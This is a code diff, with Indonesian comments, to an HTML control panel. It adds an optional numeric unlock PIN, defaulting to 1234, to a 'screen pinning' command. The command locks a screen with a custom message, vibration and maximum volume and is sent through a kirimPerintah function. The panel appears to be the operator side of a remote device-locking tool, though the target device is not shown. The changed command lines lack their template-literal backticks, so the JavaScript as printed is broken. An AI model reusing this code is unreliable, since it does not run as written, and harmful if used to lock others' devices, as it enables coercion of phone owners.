@@ -51,7 +51,7 @@
 
         <!-- 3. KARTU SCREEN PINNING (SEMATAN CUSTOM) -->
         <div class="card" style="grid-column: span 2;">
-            <h3>📌 Screen Pinning (Kunci Aplikasi/Layar Custom)</h3>
+            <h3>📌 Screen Pinning (Kunci Custom)</h3>
             <p style="font-size: 12px; color: #888;">Mengunci layar dengan tampilan khusus.</p>
             
             <div style="display: flex; gap: 10px;">
@@ -81,6 +81,16 @@
             <div style="display: flex; gap: 20px; margin-bottom: 10px;">
                 <label><input type="checkbox" id="getar_pin" checked> Getaran Custom</label>
                 <label><input type="checkbox" id="volume_pin"> Volume Maksimal</label>
+            </div>
+
+            <!-- FITUR PIN ON/OFF -->
+            <div style="background: #111; border: 1px dashed #00ff00; padding: 10px; margin-bottom: 10px;">
+                <label style="font-weight: bold; margin-bottom: 5px;">
+                    <input type="checkbox" id="use_pin" checked onchange="togglePinInput()"> Gunakan PIN Angka
+                </label>
+                <div id="pin_container">
+                    <input type="text" id="pin_code" placeholder="Ketik PIN (Contoh: 1234)" value="1234">
+                </div>
             </div>
 
             <button class="btn" onclick="kirimScreenPin()">Kunci & Sematkan Sekarang</button>
@@ -125,6 +135,17 @@
             kirimPerintah('msg|' + psn);
         }
 
+        // Fitur Toggle PIN (Muncul/Hilang)
+        function togglePinInput() {
+            const isChecked = document.getElementById('use_pin').checked;
+            const pinContainer = document.getElementById('pin_container');
+            if (isChecked) {
+                pinContainer.style.display = 'block';
+            } else {
+                pinContainer.style.display = 'none';
+            }
+        }
+
         // Fungsi Screen Pinning (Custom)
         function kirimScreenPin() {
             const timer = document.getElementById('timer_pin').value;
@@ -133,8 +154,16 @@
             const getar = document.getElementById('getar_pin').checked ? "1" : "0";
             const volume = document.getElementById('volume_pin').checked ? "1" : "0";
             
-            // Format perintah: pin|timer|suara|getar|volume|pesan
-            const cmd = pin|${timer}|${suara}|${getar}|${volume}|${pesan};
+            const usePin = document.getElementById('use_pin').checked;
+            let pin = "nopin"; // Default kalau nggak pakai PIN
+            
+            if (usePin) {
+                pin = document.getElementById('pin_code').value;
+                if(!pin) return alert("PIN tidak boleh kosong jika diaktifkan!");
+            }
+            
+            // Format perintah: pin|timer|suara|getar|volume|pesan|PIN
+            const cmd = pin|${timer}|${suara}|${getar}|${volume}|${pesan}|${pin};
             kirimPerintah(cmd);
         }
     </script>
